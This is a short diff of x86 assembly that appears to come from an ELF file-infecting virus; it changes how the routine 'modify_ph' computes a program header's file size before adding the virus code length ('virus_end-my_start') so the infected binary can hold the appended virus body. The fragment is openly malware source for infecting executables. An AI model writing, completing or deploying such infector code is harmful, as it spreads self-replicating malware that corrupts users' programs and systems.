@@ -150,7 +150,7 @@ modify_ph:
 	add ecx,HEADER_SIZE
 	add ecx,PHDR_size ; Ecx holds the addr of the second hdr in size
 	mov dword [ebp-40],ecx ; save the location of the second phdr
-	mov eax, dword [ecx+PHDR_filesize]; ph size
+	mov eax, dword [ebp-12]; ph size
 	sub eax,dword [ecx+PHDR_offset] ; finish their calculation .EAX holds the new filesize and memsize
 	add eax, virus_end-my_start ; virus code length
 	mov dword [ecx+PHDR_filesize],eax
